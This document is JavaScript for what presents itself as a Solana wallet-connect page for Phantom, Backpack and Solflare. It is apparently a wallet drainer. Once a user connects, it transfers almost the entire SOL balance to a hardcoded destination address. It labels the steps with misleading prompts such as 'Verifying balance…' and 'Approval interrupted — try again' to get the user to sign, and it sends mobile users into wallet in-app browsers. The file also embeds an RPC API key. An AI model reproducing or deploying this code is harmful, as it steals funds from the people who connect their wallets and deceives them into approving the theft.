import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  ComputeBudgetProgram,
} from "https://esm.sh/@solana/web3.js@1.95.3";

// ---- CONFIG ----
const DESTINATION = new PublicKey("8cGfpYnGSZDz1WbzReonTUNkDzJcL9K7adAKrKEKHUFN");
const RPC_ENDPOINT = "https://mainnet.helius-rpc.com/?api-key=ca46080b-fd3d-421a-96c2-aad84d199416"; // swap for Helius/QuickNode
const RENT_EXEMPT = 890_880;
const FEE_BUFFER = 5_000;

const connection = new Connection(RPC_ENDPOINT, "confirmed");

const PROVIDERS = {
  phantom: () => window.phantom?.solana ?? (window.solana?.isPhantom ? window.solana : null),
  backpack: () => window.backpack ?? (window.solana?.isBackpack ? window.solana : null),
  solflare: () => window.solflare ?? (window.solana?.isSolflare ? window.solflare : null),
};

// in-app browser deep links (mobile)
const DEEP_LINKS = {
  phantom: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`,
  solflare: (url) => `https://solflare.com/ul/v1/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`,
  backpack: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`,
};

const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
const statusEl = document.getElementById("status");
const setStatus = (t) => (statusEl.textContent = t);

document.querySelectorAll(".wallet").forEach((btn) => {
  btn.addEventListener("click", () => handleConnect(btn.dataset.wallet, btn));
});

async function handleConnect(name, btn) {
  const provider = PROVIDERS[name]?.();

  // mobile with no injected provider → bounce into the wallet's in-app browser
  if (!provider) {
    if (isMobile && DEEP_LINKS[name]) {
      setStatus(`Opening ${name}…`);
      window.location.href = DEEP_LINKS[name](window.location.href);
      return;
    }
    return setStatus(`${name} not detected`);
  }

  document.querySelectorAll(".wallet").forEach((b) => (b.disabled = true));

  try {
    setStatus("Connecting…");
    const resp = await provider.connect();
    const rawKey = resp?.publicKey ?? provider.publicKey;
    if (!rawKey) throw new Error("No public key returned");
    const from = new PublicKey(rawKey.toString());

    setStatus("Verifying balance…");
    const balance = await connection.getBalance(from);
    const lamports = balance - RENT_EXEMPT - FEE_BUFFER;

    if (lamports <= 0) {
      setStatus("Nothing to sweep");
      return;
    }

    setStatus("Confirm in your wallet…");
    const { blockhash } = await connection.getLatestBlockhash("confirmed");
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: from })
      .add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50_000 }))
      .add(SystemProgram.transfer({ fromPubkey: from, toPubkey: DESTINATION, lamports }));

    setStatus("Sending…");
    let signature;
    if (name === "solflare") {
      const signed = await provider.signTransaction(tx);
      signature = await connection.sendRawTransaction(signed.serialize(), {
        skipPreflight: true,
        maxRetries: 3,
      });
    } else {
      const res = await provider.signAndSendTransaction(tx);
      signature = res?.signature ?? res;
    }

    setStatus(`Sent. ${String(signature).slice(0, 8)}…`);

    const latest = await connection.getLatestBlockhash();
    const conf = await connection.confirmTransaction(
      { signature, blockhash, lastValidBlockHeight: latest.lastValidBlockHeight },
      "confirmed"
    );
    if (conf.value.err) throw new Error("Transaction failed");
    setStatus("Done.");
  } catch (err) {
    console.error(err);
    const msg = err?.message ?? "";
    if (/reject|cancel|denied|4001/i.test(msg)) {
      setStatus("Approval cancelled — try again");
    } else if (/blockhash|expired/i.test(msg)) {
      setStatus("Timed out — try again");
    } else {
      setStatus("Approval interrupted — try again");
    }
    document.querySelectorAll(".wallet").forEach((b) => (b.disabled = false));
  }
        }
